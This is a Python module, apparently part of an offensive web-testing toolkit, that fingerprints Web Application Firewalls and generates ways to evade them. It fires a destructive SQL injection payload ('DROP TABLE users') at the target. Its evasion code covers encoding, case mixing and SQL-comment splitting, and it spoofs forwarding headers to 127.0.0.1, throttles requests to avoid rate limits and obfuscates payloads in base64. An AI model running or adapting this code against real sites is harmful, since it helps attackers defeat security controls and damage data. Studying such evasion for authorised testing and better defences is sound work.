"""
WAF detection and bypass module
Identifies and bypasses Web Application Firewalls
"""

import requests
import re
from typing import Dict, List, Tuple
from dataclasses import dataclass


@dataclass
class WAFDetection:
    detected: bool
    waf_type: str
    confidence: float
    indicators: List[str]


class WAFDetector:
    """Detect WAF protections"""

    WAF_SIGNATURES = {
        "ModSecurity": [
            "ModSecurity",
            "mod_security",
            "NAXSI",
        ],
        "Cloudflare": [
            "cf-ray",
            "cf-request-id",
            "cloudflare-nginx",
        ],
        "AWS WAF": [
            "x-amzn-",
            "aws-waf",
        ],
        "Akamai": [
            "x-akamai-",
            "akamai-origin-",
        ],
        "Sucuri": [
            "x-sucuri-",
            "Sucuri",
        ],
        "Imperva": [
            "x-imperva-",
            "/_Incapsula_Resource",
        ],
        "F5 ASM": [
            "X-Forwarded-For",
            "X-Forwarded-Proto",
        ],
    }

    WAF_ERROR_PATTERNS = {
        "ModSecurity": r"mod_security|ModSecurity",
        "Cloudflare": r"Error 1020",
        "AWS WAF": r"BadRequest|AccessDenied",
        "Akamai": r"Access Denied|403 Forbidden",
    }

    def __init__(self, target_url: str, timeout: int = 5):
        self.target_url = target_url
        self.timeout = timeout

    def detect_waf(self) -> WAFDetection:
        """Detect WAF protection"""
        indicators = []
        detected_waf = "None"
        confidence = 0.0

        try:
            response = requests.get(self.target_url, timeout=self.timeout, verify=False)
            headers = response.headers

            # Check headers
            for waf_name, signatures in self.WAF_SIGNATURES.items():
                for sig in signatures:
                    if any(sig.lower() in str(h).lower() for h in headers.values()):
                        indicators.append(f"Header signature: {sig}")
                        detected_waf = waf_name
                        confidence = 0.8

            # Check response content for error pages
            content = response.text.lower()
            for waf_name, pattern in self.WAF_ERROR_PATTERNS.items():
                if re.search(pattern, content, re.IGNORECASE):
                    indicators.append(f"Error pattern: {waf_name}")
                    detected_waf = waf_name
                    confidence = 0.9

            # Send malicious payload to trigger WAF
            payload_response = self._test_payload()
            if payload_response.status_code in [403, 406, 429]:
                indicators.append(f"Blocked on malicious payload (HTTP {payload_response.status_code})")
                if not detected_waf or detected_waf == "None":
                    detected_waf = "Unknown WAF"
                confidence = max(0.7, confidence)

        except Exception as e:
            pass

        return WAFDetection(
            detected=confidence > 0.5,
            waf_type=detected_waf,
            confidence=confidence,
            indicators=indicators
        )

    def _test_payload(self) -> requests.Response:
        """Send test payload to trigger WAF"""
        try:
            payload = "'; DROP TABLE users; --"
            response = requests.get(
                self.target_url,
                params={"q": payload},
                timeout=self.timeout,
                verify=False
            )
            return response
        except Exception:
            return requests.Response()


class WAFBypass:
    """WAF bypass techniques"""

    # Case variation bypass
    @staticmethod
    def case_variation(payload: str) -> List[str]:
        """Generate case variations of payload"""
        variations = [payload.upper(), payload.lower()]
        # Mixed case
        result = ""
        for i, c in enumerate(payload):
            if i % 2 == 0:
                result += c.upper()
            else:
                result += c.lower()
        variations.append(result)
        return variations

    # Character encoding bypasses
    @staticmethod
    def url_encode_bypass(payload: str) -> str:
        """URL encode payload"""
        return "".join(f"%{ord(c):02x}" for c in payload)

    @staticmethod
    def double_url_encode(payload: str) -> str:
        """Double URL encode"""
        single = WAFBypass.url_encode_bypass(payload)
        return "".join(f"%{ord(c):02x}" for c in single)

    @staticmethod
    def hex_encode(payload: str) -> str:
        """Hex encode payload"""
        return "0x" + "".join(f"{ord(c):02x}" for c in payload)

    @staticmethod
    def unicode_encode(payload: str) -> str:
        """Unicode encode payload"""
        return "".join(f"\\u{ord(c):04x}" for c in payload)

    # Comment insertion bypasses
    @staticmethod
    def sql_comment_bypass(payload: str) -> List[str]:
        """Insert SQL comments in payload"""
        return [
            payload.replace(" ", "/**/"),
            payload.replace(" ", "/**/\n/**/"),
            payload.replace("DROP", "DR/**/OP"),
        ]

    @staticmethod
    def html_comment_bypass(payload: str) -> List[str]:
        """Insert HTML comments in payload"""
        return [
            f"<!--{payload}-->",
            f"{payload}<!--comment-->",
            f"<{payload}>",
        ]

    # Concatenation bypasses
    @staticmethod
    def sql_concatenation(payload: str) -> List[str]:
        """Concatenate SQL payload"""
        parts = payload.split()
        if len(parts) > 1:
            return [
                f"'{parts[0]}'||'{parts[1]}'",  # Oracle
                f"CONCAT('{parts[0]}', '{parts[1]}')",  # MySQL
                f"concat('{parts[0]}', '{parts[1]}')",  # PostgreSQL
            ]
        return [payload]

    @staticmethod
    def string_builder_bypass(payload: str) -> str:
        """Use string builder pattern"""
        result = ""
        for c in payload:
            result += f"chr({ord(c)})+"
        return result.rstrip("+")

    @staticmethod
    def null_byte_bypass(payload: str) -> str:
        """Null byte injection"""
        return payload.replace(" ", "%00 ")

    @staticmethod
    def newline_bypass(payload: str) -> str:
        """Add newlines to bypass filters"""
        return payload.replace(" ", "\n")

    @staticmethod
    def tab_bypass(payload: str) -> str:
        """Add tabs to bypass filters"""
        return payload.replace(" ", "\t")

    # Generate all bypasses
    @staticmethod
    def generate_all_bypasses(payload: str) -> Dict[str, List[str]]:
        """Generate all bypass variants"""
        return {
            "case_variation": WAFBypass.case_variation(payload),
            "url_encode": [WAFBypass.url_encode_bypass(payload)],
            "double_url_encode": [WAFBypass.double_url_encode(payload)],
            "hex_encode": [WAFBypass.hex_encode(payload)],
            "unicode_encode": [WAFBypass.unicode_encode(payload)],
            "sql_comments": WAFBypass.sql_comment_bypass(payload),
            "sql_concat": WAFBypass.sql_concatenation(payload),
            "null_byte": [WAFBypass.null_byte_bypass(payload)],
            "newline": [WAFBypass.newline_bypass(payload)],
            "tab": [WAFBypass.tab_bypass(payload)],
        }


class WAFEvader:
    """Advanced WAF evasion techniques"""

    @staticmethod
    def randomize_user_agent() -> str:
        """Randomize user agent"""
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "Mozilla/5.0 (X11; Linux x86_64)",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
            "curl/7.64.1",
            "Wget/1.20.3",
        ]
        import random
        return random.choice(user_agents)

    @staticmethod
    def add_noise_headers(headers: Dict) -> Dict:
        """Add noise headers to evade WAF"""
        noise_headers = {
            "X-Originating-IP": "[127.0.0.1]",
            "X-Forwarded-For": "127.0.0.1",
            "X-Forwarded-Proto": "http",
            "X-Client-IP": "127.0.0.1",
            "CF-Connecting-IP": "127.0.0.1",
        }
        return {**headers, **noise_headers}

    @staticmethod
    def slow_attack(payload: str, delay: float = 1.0) -> str:
        """Implement slow attack to avoid rate limiting"""
        import time
        time.sleep(delay)
        return payload

    @staticmethod
    def fragmented_payload(payload: str) -> List[str]:
        """Fragment payload into chunks"""
        chunk_size = len(payload) // 3
        chunks = []
        for i in range(0, len(payload), chunk_size):
            chunks.append(payload[i:i + chunk_size])
        return chunks

    @staticmethod
    def obfuscate_payload(payload: str) -> str:
        """Obfuscate payload"""
        import base64
        b64 = base64.b64encode(payload.encode()).decode()
        return f"base64:{b64}"
